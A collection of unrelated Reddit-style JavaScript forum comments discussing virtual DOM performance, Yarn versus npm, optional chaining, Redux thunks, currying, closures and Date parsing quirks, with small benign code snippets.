Thank you very much for the notice. This is, of course, fail. Updating... and done.
&gt; I get that modern vdom frameworks have improved a lot on a naive implementation, but they haven't come close to making up the massive performance penalty that the virtual DOM introduces. That simply isn't true. If you look into Inferno, you'll see very little overhead from creating virtual DOM, especially if any of the virtual DOM is static. I've extensively compared it to all the other major non-virtual DOM libraries out there and they are a considerable distance behind Inferno when it comes to benchmarks. Furthermore, the community of people using Inferno in real-world production apps have seen a big performance gain from adopting Inferno (previously having used frameworks/libraries such as Riot, Ember, Angular, Knockout etc).
[Calypso](https://github.com/Automattic/wp-calypso) is the new wordpress.com front end rewritten as a single-page web application using Node and React. This is [an old comment](https://www.reddit.com/r/reactjs/comments/496db2/large_open_source_reactredux_projects/d0qivnk/) which points to a few more projects.
&gt; well written Python Never seen in wild nature. Seriously, the only Python which is `terse but expressive` is that one from hello world like examples. The rest does always look like the code from the link.
So what you are trying to achieve is this ? https://github.com/micromata/http-fake-backend/
&gt; code like a moron Wondering, would it be much harder to do so in case there is a limit on the line length of, say, 80 characters?
Non-technical users by definition don't have the capacity to know if a site uses a virtual dom framework. Slowness from ads and social media bloat in content sites has nothing to do with performance in highly interactive applications (let alone the subset that uses virtual dom libraries). The former shouldn't even be using javascript, the latter requires it for mission critical features. They're completely different beasts. To counter your anecdote, I'v heard plenty of times about people who saw huge performance improvements from porting a codebase from one of the big frameworks to one of the high perf libraries mentioned in this thread.
https://github.com/search?utf8=%E2%9C%93&amp;q=react+language%3AJavaScript+extension%3Ajsx+size%3A%22%3E+10000%22&amp;type=Repositories&amp;ref=searchresults maybe a github advance search similar to above?
This doesn't seem like a good implementation of a stack. Firstly the array behind the stack is not hidden from the end user, there's nothing to stop the user accessing and modifying`stack.store` and `stack.top` directly to break the FILO rules. Secondly, popping the stack only changes the the top attribute, it doesn't actually free the item from the array. Big memory leak! If you really want to implement a stack properly in ES2015 you need to use closures and WeakMap. Here's a an implementation with that in mind, using ES2015 features. If you want it to throw errors when the stack is empty that should be trivial to add to this. const privateFields = new WeakMap(); export default class Stack { constructor(arr) { privateFields.set(this, arr); } push(item) { privateFields.get(this).push(item); } pop() { return privateFields.get(this).pop(); } peek() { const arr = privateFields.get(this); return arr[arr.length - 1]; } }
Best talk I've been to, the presenter played a video of him coding at 1.5x and talked through each part. Not sure why this method isn't more popular. Every talk now "oh the WiFi here is slow, sorry about that" 
Great stuff, although I really don't feel like doing this with big object trees where you're not always sure which keys are available. Doesn't the tool create a whole new set of objects? Sounds kind of memory intensive if you ask me. CoffeeScript's existential operator really is excellent, too bad it never made it into ES6: Example from CoffeeScript: person = {} person?.name?.getFullName?()
yippy. new "best framework" on the block.
Yeah, I've been using polymer extensively in our projects and we love it. Can't wait for 2.0 to land.
I hate a lot of coffeescript's syntax but this feature seems really nice and so much less cluttered than doing `person.name &amp;&amp; person.name.getFullName &amp;&amp; person.name.getFullName()`.
Thanks for detailed explanation...So, do you feel that it's worth it? Does ES6 really bring the advantages you missed all these years? More I look at the code of various projects in Github, more I think that fat arrows is the only helpful feature in there..
[removed]
[removed]
Here we go another... Oh shit this is actually really cool. I don't have any need for this but this seems promising for someone with design focused products. 
I think the idea of non-null object types is a fine one, but this is really something that should be part of the language. If `nn` isn't used throughout all the software, this could cause confusion and unintentionally introduce bugs. I also wonder about interoperability with other libraries. Really, I strongly believe that language extensions, of which this arguably is, belong either in the compiler or the language specification. If you truly want something like this in your software look into [Option types](https://en.wikipedia.org/wiki/Option_type). There are many languages that compile to JavaScript that support this.
Swift has it too. Although they are required for any optional types. Swift also has a ?? operator: person?.name?.fullname ?? "Value if nil"
I wish we could at least not use Angular 2...
:) What makes you say that? What would you rather use?
There are DOZENS of us!!
I was quoting the part of the original article that was wrong :D
Web Development is a hard confusing world but you'll get if you keep reading and trying things.
I've been writing some articles about an app I'm messing with that uses vue and the spotify api. In the third part of this series I re write the previous application to showcase vue-router.
Didn't Lodash have something like this already?
Made a google trends chart: https://www.google.com/trends/explore?q=%2Fm%2F0b6h18n,%2Fm%2F07zh7,%2Fm%2F0_x5x3g,%2Fm%2F0gvrdv3,%2Fm%2F01yp0m Looks like VIM/Sublime are leading the trends. PS: I use vim.
You can add more points into cdt2d like this: https://github.com/mattdesl/svg-mesh-3d/blob/1f765b7d18e3193030c464ad22cd252b807d44d9/index.js#L48 I was using that just so that when the 3D mesh breaks apart, it will appear as many smaller and slightly more uniformly-sized triangles. I'm sure you can get a bit fancier with how those extra points are added, but maybe still it isn't exactly what you are looking for.
Even though angular passed the "final" mark already, it is way too early to take it as stable. Their rapid releasing of new versions shaked the whole JS community. The docs, the examples, the Stackoverflow... nothing is relevant since the biggest things were refactored in RC phase anyways. I'd suggest you reading another review I've found: https://hackernoon.com/why-learning-angular-2-was-excruciating-d50dc28acc8a#.9hxtsimlf It is just absurd. We will see what the future will bring us... :)
:/ 
While I personally don't like Angular 2, combined with ionic2 it was actually ok to deal with since it takes away most of the setup/bootstrap so you're left with only a limited amount of angular 2 specific stuff which was ok given what ionic2 tries to achive.
I think the functional languages are fun to play around with. The approach to solving a problem is very different, so it can open up your mind a bit. Elm in particular, since its syntax is fairly simple, and the official site has several examples you can play with live. F# would be neat also, but I haven't gone beyond watching a few video tutorials on it. Being able to use .NET libraries is a big win for F#.
I think the readability issue is key here. You should be save to assume that accessing an object's property should work like it does out of the box. Black magic is confusing and usually a performance hit.
OCaml and/or SML are worth learning. They're both relatively small (compared to Haskell or Scala) statically typed languages that introduce some important concepts like pattern matching, algebraic datatypes, type inference, and modules. They have some other minor things that are interesting like no non-local control flow except through exceptions.
C++ for it's vast usage, Java for Android apps, Swift for iPhone apps. 
... this belongs in /r/programmerhumor 
At first, you can use default Chrome profiler, for example. Also there are several sites as jsperf.com which allows to measure speed for specific pieces of code in different environments. And there are lot of benchmarks, just google it. In Chrome profile results, usually, you should not see significantly bigger values for any single function. If you see all functions uses 1-2% of cpu and some specific func uses 20% cpu – usually it means there is some issue with this function (unless you know why exactly it requires so much computing time)
You're right, I guess type assurance/checking is a better way of saying it.
Well, they broke bunch of stuff, let say react-hot-reload@1.x
Try: xhr.overrideMimeType("application/x-binary; charset=ISO-8859-1"); &gt; The first 128 characters of Unicode, which correspond one-to-one with ASCII, are encoded using a single octet with the same binary value as ASCII https://en.wikipedia.org/wiki/UTF-8
We have a broken build on shippable because enzyme can't find a required file. They should have done this in a major. Maybe if they haven't skipped 14 majors before, they'd have some left. /s
You are the goddamned man.
Clever, but this feels like way too much magic for my taste. The cognitive overhead is &gt;&gt; than the benefit.
Where's Assemble? Ahahah.. Omg.
You can dispatch any amount of actions in a thunk so maybe just add another dispatched action? const requestGetUser = (id) =&gt; (dispatch) =&gt; { dispatch({type: 'REQUEST_USER'); return axios.get(`/user/${id}`).then((response) =&gt; { dispatch({type: 'REQUEST_USER_SUCCESS', payload: response.data}); dispatch({type: 'REQUEST_USER_IMAGE', payload: response.data.username}); }); } Alternately, you could have REQUEST_USER_SUCCESS be a thunk. This would allow you to add some logic to the async chain that determines when you should get the avatar. In this case I'm just fetching avatar if we haven't already got one by using the optional getState argument from the thunk. It also assumes that the API the will be called in REQUEST_USER_AVATAR uses the username for the call. const requestUserSuccess = (payload) =&gt; (dispatch, getState) =&gt; { dispatch({type: 'UPDATE_USER', payload}); const hasAvatar = getState().user.avatar; if (!hasAvatar){ dispatch({type: 'REQUEST_USER_AVATAR', payload: getState().user.username}); } } 
Thanks for highlighting [Assemble](http://assemble.io). It's in the other category. Sorry. A twitter poll only allows 4 choices. 
Very nice, but not optimal benchmarks. I never said Vue.js was *not* performant either - the argument is Angular 1 is just like Vue. Yes Angular 1 using dirty checking is probably one of the biggest differences. After running my own benchmarks, Vue is about 2s faster on average for 10,000 row insertions and clearing. When you git clone that repository and look at Table Report, it is updated with the new changes people have made. The table you linked me is out of date. The new one makes Angular 1 look really nice. It only does bad on 2 benchmarks, and unfavorable on 1. The 2 things that stick out to me in the benchmark code is: they aren't using one time bindings, and they (ng-repeats fault actually) aren't caching the template. My change only incorporates the one time bindings. I look forward to what 1.6 looks like. Thanks for the fun argument :) You've convinced me to look into Vue.js because of their similarity. I do believe Vue will always come out faster, but nothing significant in a real scenario. If we talking millions of elements...I'll put my money on Vue!
After you work with Javascript for a while, you realize this is a solution to a problem that you shouldn't have. You should be asking, why don't I know whether a property is there or not? Is the benefit of not having to write a property check outweigh the downside of errors being silenced? There has been many proposals for the existential operator "nnPerson?.name?.last" in javascript and most have landed on that it is a bad idea. It is the same reason that Python doesn't return None for "my_object.not_a_property". It instead throws an error. It's harder for a developer to find a silent None/undefined than an explicit error. A better solution is to use something like Typescript or Flow. It allows you to define your types and know exactly whether a property exists or not.
You already know about iteration, logic, callbacks, events, properties, compiling, IDEs (assuming you know JS/Java/.Net). You are a developer. Now it's time to learn about requirements and design documentation, multi-threading, object oriented design, the rules of relational database normalization, transactions, application architecture, and enough network engineering to be able to tell when someone is bullshitting you. 
Seems more cool and cool. Great job for 3kb thing! I'm following the project for some time and it goes okey.
Others should be in other category. It is main thing for years. Even more because it's core - `base`, `assemble-core` &amp; `generate` are going more and more awesome. btw, for anyone interested don't look the site, it is pretty outdated, follow whatsup on https://github.com/assemble and https://github.com/node-base
FYI: I've used the staticgen.com listing and Hexo, Gatsby, and Metalsmith have more GitHub stars (so far).
Gatsby 
Cheers! Thanks for pointing out that mistake. I think I need to come up with a naming convention soon. I am throwing around class and id everywhere. Thanks again for helping solve this!
Sure, that "you" was more like a future reader "you" rather than personally "you" :)
Thanks! I'm actually using RE:DOM for all my projects now. Even with large single page web apps. I have redux-like state handling with dispatchEvents upstream and component updates downstream. If you have any questions about RE:DOM, I'm happy to help, just raise an issue or send me email / private message 😉
&gt; Prolog You have no mercy 
&gt; *May or may not contain any actual "CSS" or "Tricks".
There is literally no reason NOT to use yarn. If you have a few dependencies, just the amount of time npm takes to figure out what you need, yarn has done that and installed it. Using yarn vs using npm is not much difference. Yarn team does their best to keep compatibility the same. All you have to do is learn the new command changes.
Hey I copied the resumable drive uploader that we use at Moo.do (w/ comments stripped unfortunately). This is written to be run from the browser. You absolutely won't be able to run it out of the box, but feel free to grab what you want or use it as a guide for your own. Usage is to construct a DriveUploader then call 'upload'. Hope that's helpful! https://gist.github.com/cowsrule/c2221d76301aed6566d0aba49f9229a6
Assuming you do have some C/C++ experience (couldn't really tell from the description), I'd echo what others have said and pick something functional. Elm, Haskell, Scala, F#, OCaml, etc. Don't stress about which one! You can drive yourself mad reading all of the "why X is better than Y" blogs and opinions on the internet. You'll learn 100x more just picking one and trying to build something with it than agonizing over the decision for 3 months.
Yarn is what NPM should be.
Yeah it's a views router. It's really easy to parse path / hash anyway. Like: const hash = location.hash.slice(1).split('/'); ... location.hash = '#' + hash.join('/'); Btw. If you're interested in creating your own view library, check out my talk from HelsinkiJS / Frontend Finland: http://youtu.be/0nh2EK1xveg 😉 RE:DOM doesn't differ that much from FRZR.
Cool, thanks for the link. It's not that easy if old browser support is need.
You can get their position on the page the same way you were getting the position if the body element (getBoundingClientRect()). This is what I was thinking: https://jsfiddle.net/0etm99cv/1/ EDIT: I just noticed you didn't change the dot until the container was at the top of the page. You can just remove the halfScreen part of my fiddle for that same effect.
nothing, js is the future of everything 
I'm in the process of writing some go for work and I wouldn't recommend it. I appreciate the tooling and ecosystem, but I don't find that I enjoy writing it at all. For someone with a strong python or other OOP background it may be nicer, but for me, it has been a real struggle so far (and not a fun struggle). 
Essentially, no. I don't have a load of experience with C and C++, but I have had some very good results with them. In fact, I've been doing C++ with node.js for a fair few years now. It was a very steep learning curve that way. The binding between JavaScript and C-land is always C++. The algorithms which I ported from an already optimized style of JavaScript hardly needed to be changed to be C (replacing var with int or something else in a few places). Simple JavaScript looks a lot like simple C, but it uses code that Cargo-cult-coding is used derisively regarding the copying and pasting code from one source without properly understanding it. That was the only way I could get any results, and it worked for me. The interface code that gets used in node has since been tidied up. You'd probably find the binding between C-land and JavaScript the most complicated, but writing algorithms that operate on data inside of the bindings much easier. Getting data in typed arrays in and out of C-land has been one of the trickier things for me.
When trying to go from those to learning an interesting functional language, you have to be careful you don't bite off more than you can chew and that you feel like you are getting something out of it. On that note, I recommend learning elm next. The official documentation is very good and has some really nice getting started tutorials that teach you how to get started building things, the basic concepts of the language, and why their type system is a useful and helpful thing. Elm is really focused on user experience (as in the programmer is using elm, so they are the user) especially when it comes to error messages. Elm has the most helpful error messages I have ever seen, which is great in general but especially when learning a new language.
Not with WebAssembly.
Just get some Arduinos(C++) and play with them, also there is Espruino(JS), and can i tell you, its so fun building something that can actually move, get data, help around and just entertain. I'm building a car that drives around the office and picks stuff up, and everyone if the office can can control it thought web interface, using inside server running on Arduino WiFi module. I can tell you its challenging, but oh my god its fun. And, if you know JS, i think it doesnt matter where you are going, as long as you are doing what you want to do.
There's also large bug fixes in yarn that make it useful. Long ago npm broke their link functionality very badly and have seemingly no interest in fixing it. It works completely fine with yarn.
Someone pays you for this?
Only a matter of time my friend
Eh, that's why I'm so hesitant. I don't want to spend time looking for all these packages, certainly not writing my own theme. If github sticks to its plans to make Atom faster, my reason for wanting to move to Visual Studio code evaporates. If I move to a new gig that gives me a new computer for work, that'll be the scenario I start using VS Code
I found it easy to pick up, but not at all enjoyable to write. Without generics, it's not possible to write DRY code. I've moved on to Scala, which I'm finding to be the exact opposite of Go - difficult to pick up, but very enjoyable to write.
Oh wow I must've been staring at it too long to realize I was already using the method I was trying to find. Thanks for your help! And actually I prefer it at the half like you had.
What an odd article. "Here's a new thing which is better than the old thing in basically every way. Switching to it has no drawbacks and will improve your life. But you don't *need* it! You can still use the old thing and just suffer a bit!" Okay, granted. *But why would I want to?* Also, the articles attempts to explain why yarn's improvements aren't that great aren't very compelling: &gt; If you haven’t had issues with shrink-wrapping dependencies or dependency versions clashing, then you don’t need Yarn. I would suggest that if you haven't had issues with shrink-wrap not working properly you haven't tried to use shrink-wrap properly in production. And if you haven't been trying to use shrink-wrap, you don't really know what you're doing and shouldn't be making recommendations to other people. It's a critical feature and it doesn't work with npm, it's that simple. &gt; Other features listed on Yarn’s homepage include “Offline mode”. But when was the last time you were developing a website without an internet connection Again, if you're actually doing this stuff for real, you undoubtedly are using a CI server, you quite likely have had issues when NPM was briefly down, and you can at least understand why you might be skeptical of a system that requires your CI server to talk to an external repo for every build. Practically and conceptually it's wrong in an obvious way. To boil it down to a "hey, I always have a net connection when I'm hacking on my dev laptop!" suggests you don't really understand the problem and shouldn't be making recommendations to other people about how to configure their build pipeline. &gt; recently tutorials and basic code demos have been recommending Yarn to install a handful of dependencies. Why make it harder for newcomers to JavaScript to get up and running? Yarn is easier for everyone because it has a better UI. Newcomers are actually the *ideal* candidates to recommend Yarn to, because they won't have to rewrite existing scripts or pipelines. Especially when your argument for why they should use NPM instead is "it's slower than yarn, but *not that much slower*". Yes, a newcomer's small project won't benefit *as much* as a large project will from yarn's speed, but are you really suggesting they should wait until they have a ton of dependencies and *then* switch? That's absurd. Sometimes after you've written an article you should step back, think about what you're trying to say, review the article to see if you've actually said it, and then sigh sadly and delete it when you realize you haven't even come close. Yarn is faster, easier to learn, and fixes some critical bugs. The only real argument you can make about yarn is that while good, it may not be worth switching an existing project/pipeline over to it immediately; it depends on resources, priorities, and how strongly you're being impacted by npm's shortcomings. (And indeed, at my day job we haven't yet switched our main npm-based project over to yarn, although we are planning on doing so when we can find the time, because we're not idiots, and we know it will improve our lives in small yet concrete ways.)
Haha wasn't really arguing. Just have a bit of fun. :) Bottom line is, for me at least. The reason why I chose Vue.js for a recent project is because I work with other people that have various skill levels, and Vue.js is really approachable. Just to give you an idea of how approachable. It took our PHP backender about a day to get to grips with the basics because of the awesome documentation. And now he's building out the easy front end features on his own. In any case though. Still have a soft spot for Angular 1. :)
Compared to Pluralsight, I love the interactive element of CodeSchool. I just did the flexbox course tonight - it was fairly basic but I feel I learned more than just skimming the docs and messing around in jsfiddle. Hopefully I'll have time to get a few more in this weekend!
Lol this guy First of all, Yarn is practically a drop-in replacement for npm. There's very little that you'd have to change about your project for you to be able to migrate to Yarn today. The very most you'd have to do would be to reconfigure some versions in your package.json if you use a npm-shrinkwrap.json as well. In addition, Yarn accomplishes a very similar set of tasks to npm. They're both package managers, along with `brew`, `composer`, `bundle`, and `apt`. One you figure out how to use one package manager, it's generally not terribly hard to get the gist on how to use any other package manager. The only real difference in this particular case is `yarn add` replacing `npm install`, which is completely trivial. npm and Yarn are designed to solve the exact same problem regardless of the environment they are used in. There is no "we should use npm in this scenario and Yarn in this other scenario" because they both accomplish the same task regardless of where you use them. The only opinion piece that needs to be written on the subject of Yarn vs. npm is this: which one is better? And Yarn is superior in almost every conceivable manner, only losing out perhaps in longevity and familiarity. But again, this isn't like classic JavaScript fatigue where you have to spend time migrating all your stuff to some new technology only to realize that you're behind again. This is about as drop-in of a replacement as you can get. There's nothing new to learn in order to use Yarn effectively, but the long-term gain from "innovations" like automatic lockfiles (which other platforms have had for years now) and extremely basic QOL improvements (like halfway decent install times) far outweigh the three minutes it would take for you to configure. Because that's literally how long it takes to get Yarn up and running. And half of it is waiting for npm to install the damn thing. TL;DR: Do I *need* Yarn? Probably not. Do I *want* it? Hell yes.
That's actually the inspiration for the name! I was thinking of using cutoff shorts as the logo for nn. :D
I realized that my comment might have been a bit harsh. I agree if you don't use a server it has no backend. My hope is that no one would use it with their key in the browser. I know it's cool, but stripe explicitly says not to do that. As a stripe library for stdlib, this tool is great. If you market it that way, I am completely on board. I have a password manager for all my accounts. I never have to type any usernames or passwords. They are autofilled automatically.
Thanks for the feedback everyone! Really appreciate it. I'll address a few comments here, as some of them overlap. I agree that the Existential Operator (e.g. person?.name?.first) would be nice to have in JS, and preferable over use of a library. It is currently being discussed, and I see no indication it won't make it into the language at some point: https://esdiscuss.org/topic/existential-operator-null-propagation-operator Nevernull provides you with the same functionality the Existential Operator provides in various other languages (Ruby, Groovy, Dart, CoffeeScript, etc) Regarding comparisons to lodash _.get: the original version of nn that I wrote 3 years ago looked somewhat similar in that it used strings to access properties, but it also varied in that it was recursive: https://github.com/jasonmcaffee/nn/tree/94408b7732ee4b2169198db830dba079423878aa I decided to deprecate that API because Proxy allows us to provide a much cleaner and less verbose API. Thanks again 
OP is not wrong. You can statically type your objects in a way that will force you to check for null/undefined upon each use, which solves this problem semantically at compile time itself, versus this lib which does it at runtime. But I agree this isn't fail proof for any 3rd party code, especially for which you don't have a reliable type definition.
CoffeeScript is getting there, check this out: https://github.com/coffeescript6/discuss/issues/52 There's now: ES6 classes, async/await, ES6 splats, template literals and more. It's in the 2 branch, to be released soon.
Thank you so much for telling us about this. I am working on a project and I needed to learn JS. You are awesome. I hope you get laid this weekend bro.
I'm not doing your homework for you kid
The article is a waste of time but the library ([official website](http://mojs.io/)) looks fucking cool and that web animation at the bottom of their main page is *so smooth*.
&gt; Your suggestion to reinvent the wheel is the embodiment of evil. You are over confident and I am thankful I don't work with you. There is a hint of legitimate value to this idea. Sometimes it is better to simply improve an existing library / framework than to build an entirely new one. However, often a popular library or framework is chained by its users, so making significant improvements requires significant breaking changes, and you;re essentially reinventing the wheel. The difference is that the wheel is rounder, and has bearings so it moves more easily now. &gt; I was wondering if this were a millennial thing. No. Now, on to the linked thread: &gt; You don't need a framework to build a large elegant application. Not even a pretend one. You need abstractions of some sort. If a piece of software needs to be maintainable and improvable over a long period of time and between many different devs, those abstractions are a practical necessity. By establishing a consistent abstraction, developers can avoid spaghetti code and cognitive distractions. Frameworks are merely sets of abstractions. &gt; I guess you are utterly incapable of imagining until you have written a large application without any hint of a framework. This comes off as pretentious as fuck, which is probably why that guy responded the way he did. You can write a large application without a framework. Of course you can. But abstractions make your job so much easier. Why would you avoid them? I doubt there is much successful software written without any meaningful abstractions. This is what the guy was talking about. When you build your own software from scratch without libraries, you will establish abstractions if you're a smart dev. Once you have established a set of abstractions that you use consistently, you have a framework. You, several times throughout the conversation, ignore what he says and continue on. For instance, he explicitly states that he's only addressing UI development, but then you reply saying that he's assuming that "JS is primarily for front-end and that front-end is UI." He also asks you a question, whether you agree or disagree with his summary of UIs, and you just don't even address it. &gt; Yes, frameworks will minimize certain risks, but they won't prevent you from writing horrific bloated code. They won't prevent you from making faulty assumptions or wasting time on simplistic things. Frameworks aren't going to solve your security and accessibility problems. At some point you still have to make original decisions the framework won't make for you. This is absolutely true. It's why I prefer dealing in simpler abstraction layer libraries like React versus a fully-fledged opinionated framework like Angular. &gt; Most of the common justifications for frameworks are validations of incompetence Not really. Sure, some people may use frameworks because they are just able to skate by copying snippets from SO, but many professional teams use frameworks because they allow the devs to focus on the things that matter.
Wrote a ‘polyfill’ for CSS `mask-image` using JS and canvas. It's not a full implementation, it reads an SVG path in a data attribute and draws a png image using its shape and the source image. The reason i made it because mask/clip-path support in Firefox and IE are absent or incomplete and loading high res png is easily 10 times as much data compared to jpeg. Will be published later on, it needs some additional testing/error handling. 
Hey, I am rebuilding the app at the moment as it has had a good response so far. I want the content to be more user driven and voted on as opposed to being solely the resources I like. I am also planning to have learning pathways for beginners as well as more in-depth categorisation. I will take note of your feedback! 
https://github.com/prettydiff/schadenfreude A quick and dirty service uptime dashboard with a complete graphic user interface. We had a 2 day hackathon at work this week, and so I thought I would do something fun. I am severely under-performing at the day job full of backbone.js and Java, so used this time to do something that doesn't crush my soul. At the same time it is also helpful because we face constant internal service interruption. To play with the UI you can run the page in your browser without running the node service. It won't connect to anything though.
Doing the ES2015 course. Very good, the exercises and challenges are a little basic but certainly reinforces and explains what I've kind of pieced together by reading &amp; writing ES2015 mostly through the React / Redux course on Pluralsight. Planning on doing another course tomorrow, not sure what yet possibly one of the design ones. Any recommendations? The React course looks too basic for where I'm at now (getting my teeth well into Redux)
Wes Bos has a great Flexbox series on Youtube as well. 
C# with .NET Core
And that's why we write unit and integration tests.
Practical applications of Currying: http://stackoverflow.com/questions/113780/javascript-curry-what-are-the-practical-applications 
When you're learning Redux right now, absolutely go for the Redux courses from Dan (author of Redux), and DO ABSOLUTELY NOT SKIP ANYTHING, even if it seems easy. This is a mistake me and some other ppl on reddit did. We ended up not getting Redux. I redid the whole course and it finally clicked. You can watch it for free: https://egghead.io/courses/getting-started-with-redux .. and for later on/after the getting started course: https://egghead.io/courses/building-react-applications-with-idiomatic-redux I don't know anything about the courses on CodeSchool about Redux, but these two (especially the first) is all you need to get how Redux works.
/r/titlegore
I don't want to be that guy, but this is like being sent ten years back in time. Don't teach this.
For producing things like factories, generators, currying, and other named pattern concepts. Honestly, though, to me returning a function from a function sounds like some stupid framework incomplete concept. If I know I have still have work to perform, as in the returned function, anticipate the problem and solve for it directly so that you can output the desired result instead of additional work to be performed further down the road.
If you want to learn a popular back end language I would suggest PHP. Some popular web applications use it and it goes well with JS.
Can you Be little Clear ?
Beautuful
&gt; vim try ctags.
I feel like there are three big problems with using currying in Javascript (versus say haskell) 1. The ecosystem as a whole doesn't use currying, so any libraries using it makes it more confusing than not. That is, unless it's built from the ground-up to be curriable and is high-level enough, such as lodash/fp which is a god send. 2. The "this" object always fuck with currying and it's really annoying. Unless a method is bound to the object, any currying or partial applications will screw up the "this" and makes it fail. So, more often than not, using an anonymous function referring to "that" or whatnot makes code cleaner and easier to read. 3. Lastly, currying isn't built in the language so it's always a pain and there's a danger of breaking existing API. Someone else in the comments gave that as an example: const add = (x, y) =&gt; x + y; const add1And = add.bind(undefined, 1); add1And(2); I know it's just an example, but in practice: const add1And = function(x) { return add(1,x); } // or even: const add1And = x =&gt; add(1,x) Is just as clear and easier to read IMHO, which is very unfortunate because I love removing useless variables. If Javascript really supported currying, we would only need: const add1And = add(1) 
now that is one ugly looking code
&gt; This comes off as pretentious as fuck, which is probably why that guy responded the way he did. I expected no less. When the argument is simply crying and a tired cliche any response (other than total agreement) will likely seem arrogant. &gt; But abstractions make your job so much easier. Why would you avoid them? That is not what makes maintainable code. This is a common mistake. It comes down to easy or simplicity. If you want it easy you will include as much as possible so that you have do as little as possible. If you want it simple you will work harder to keep all the bullshit out. &gt; I doubt there is much successful software written without any meaningful abstractions. https://github.com/prettydiff/schadenfreude I wrote that within 48 hours this week for a work event. It contains a web server, asynchronous curl, and a complete graphic user interface all in vanilla JS. There is no framework, not even a pretend home grown one and minimal abstractions. Still the code is fairly simple to follow and easy to maintain just due to separation of concerns. &gt; You, several times throughout the conversation, ignore what he says and continue on. Absolutely. He/she tried on several occasions to redefine development to the small edge case they were familiar with. I didn't ignore it though. I discounted it outright.
The first example that comes to mind is if you want to create x buttons, and have them alert their index onclick, like this: for(var i=0; i&lt;5;i++) { var button = document.createElement('button'); button.textContent = 'Button ' + i; button.addEventListener('click', function() { alert(i); }); document.body.appendChild(button); } This code will actually always alert 5, which is not what you wanted. So to make every button alert it's number, you would "capture" the value of i in a closure: for(var i=0; i&lt;5;i++) { var button = document.createElement('button'); button.textContent = 'Button ' + i; button.addEventListener('click', (function(index) { return function() { alert(index); } })(i)); document.body.appendChild(button); } In this case the "parent" function is declared and called inline, but it doesn't have to be like this. You could declare it separately: var buttonClickHandlerFactory = function(index) { return function() { alert(index); } } for(var i=0; i&lt;5;i++) { var button = document.createElement('button'); button.textContent = 'Button ' + i; button.addEventListener('click', buttonClickHandlerFactory(i)); document.body.appendChild(button); } 
I'm glad you and /u/leeoniya are still fans. I still have ambitions for ThreaditJS and I'm getting close to being able to work on it again, so stay tuned! 
[Why........](http://i.imgur.com/Q7U4Nyh.png)
One of the first evangelists of currying no longer believes it is a good idea. Can't find the article right now.
Didn't you notice the hour difference between the two?
YYYY-MM-DD uses the ISO 8601 shortened format. It assumes the time is based in GMT, and the date then adds the timezone offset for your computer. new Date("2016-12-08") Wed Dec 07 2016 16:00:00 GMT-0800 (PST) In order to get this back to the date that you wanted you would have to subtract the GMT offset. In this case, subtracting -8 from the resulting date will effectively add 8 hours to the time, giving Thurs Dec 8 at 00:00:00. 12/08/2016 uses the Javascript "short date" format, which is based on your computer's timezone, not GMT. When you type 12/08/2016 the time will be set to 00:00:00 within your own timezone. The result seems to be the correct date and time, new Date("12/08/2016") Thu Dec 08 2016 00:00:00 GMT-0800 (PST) http://www.w3schools.com/js/js_date_formats.asp Edit: I should point out that ISO 8601 should be the standard for Javascript, and developers should shim the date display with a "subtractTimezoneOffset()" function which will fix the date for display purposes. The real head scratcher is why "YYYY-MM-DDThh:mm:ss.sss-08:00" shows the correct date but the wrong timezone offset, but "YYYY-MM-DDThh:mm:ss.sssZ" and "YYYY-MM-DDThh:mm:ss.sss" add the timezone offset to produce the wrong date but the right timezone. new Date("2016-12-08T00:00:00.000-08:00") = Thu Dec 08 2016 00:00:00 GMT-0800 (PST) new Date("2016-12-08T00:00:00.000") = Wed Dec 07 2016 16:00:00 GMT-0800 (PST) new Date("2016-12-08T00:00:00.000Z") = Wed Dec 07 2016 16:00:00 GMT-0800 (PST) 
U can publish an npm package with the built version included still u don't check it in to git. U just need a different dotfile for gitignore and npmignore.
Haha wow, no I did not. I &lt;3 JS. 
I THINK I GET IT! I just tried it on my home computer, and because I'm in England (GMT+0), I basically live in the 'international standard' time zone in a sense. And when I do it in this time zone, both of those inputs come out as exactly the same date, Thu Dec 08 2016 00:00:00 GMT+0000 (GMT Standard Time) And here's the reasoning, like it or not: the top format is interpreted as **local** format, so whatever date you put in there, it parses it to your local time zone. So no matter where you are, it will say Thu Dec 08 2016 00:00:00, followed by your GMT offset. Whereas the bottom one is written in international ISO standard, year-month-day, and so when it parses it the date becomes Thu Dec 08 2016 00:00:00 GMT+0000, and then *afterward* they translate that time into your local time zone. [edit] I think I just said what /u/Buckwheat469 already said, but in different words.
Do whatever makes this easy for you. If you are deploying infrequently, its not taking much time, and you'd prefer to spend time writing your actual app, then you can keep doing what you are now. Pushing your dist folder is fine in this scenario too. To add improvements to this, add a script that you run on your server to automatically run the commands you normally would manually. Then to improve that, you can add a hook to github to listen to when changes have been pushed, and automatically run this script. You can improve that by setting up a CI server (e.g. Jenkins) on there to be doing the same thing, but keeping track of your builds and a ton of other improvements. Don't worry about using branches to solve this problem. If you want to practice use of branches, then keep your master branch with all of your code in it, and create a new branch that is going to contain your next feature. Keep pushing commits into this new branch, and when you are happy with the feature, then merge it back to master.
but why is there any ambiguity in the first place with string parsing? why not assume **either** _everything_ is UTC **or** _everything_ is local. cf. [http://mzl.la/1fvwX1i](http://mzl.la/1fvwX1i) (thanks for the link on twitter /u/khoker )
I just responded on twitter too :) I suspect it's the same reason that it doesn't assume the local minute. It's just filling in the data you don't provide. A format like ISO 8601 was meant to alleviate confusion, right? So if you only provide '2016-12-08', JavaScript assumes '2016-12-08 00:00:00Z'. It shouldn't guess the local timezone any more than it should assume the local hour. Or minute. I'd make the argument all the *other* parsing is wrong. But 12/08/2016 isn't an international standard so, for whatever reason, it just assumes you want the local timezone. Not sure.
I just looked through that code and immediately saw several abstractions. And they made the code easy to follow, you're right. &gt; Absolutely. He/she tried on several occasions to redefine development to the small edge case they were familiar with. No. They tried to limit the conversation to what they were actually talking about, instead of some much broader topic. You just kept going, disregarding this request, which is when you lost him. You could really do with a reduction in condescending attitude. I'm sure it would drastically help when conversing with others online. I can deal with it, but you're really not doing yourself any favors by repelling other viewpoints with the toxicity. 
